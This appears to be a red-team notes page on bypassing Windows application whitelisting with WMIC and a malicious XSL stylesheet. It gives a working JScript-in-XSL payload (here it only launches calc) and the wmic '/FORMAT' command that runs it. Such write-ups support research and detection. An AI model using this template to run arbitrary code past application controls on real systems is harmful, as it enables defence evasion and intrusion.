# Application Whitelisting Bypass with WMIC and XSL

Another application whitelist bypassing technique discovered by Casey @subTee, similar to squiblydoo:

{% page-ref page="t1117-regsvr32-aka-squiblydoo.md" %}

## Execution

Define the XSL file containing the jscript payload:

{% code title="evil.xsl" %}
```csharp
<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
	<![CDATA[
	var r = new ActiveXObject("WScript.Shell").Run("calc");
	]]> </ms:script>
</stylesheet>
```
{% endcode %}

Invoke any wmic command now and specify /format pointing to the evil.xsl:

{% code title="attacker@victim" %}
```csharp
wmic os get /FORMAT:"evil.xsl"
```
{% endcode %}

![](../../.gitbook/assets/screenshot-from-2019-04-10-22-05-24.png)

## Observation

Calculator is spawned by svchost.exe:

![](../../.gitbook/assets/screenshot-from-2019-04-10-21-57-52.png)

## References

{% embed url="http://subt0x11.blogspot.com/2018/04/wmicexe-whitelisting-bypass-hacking.html" %}



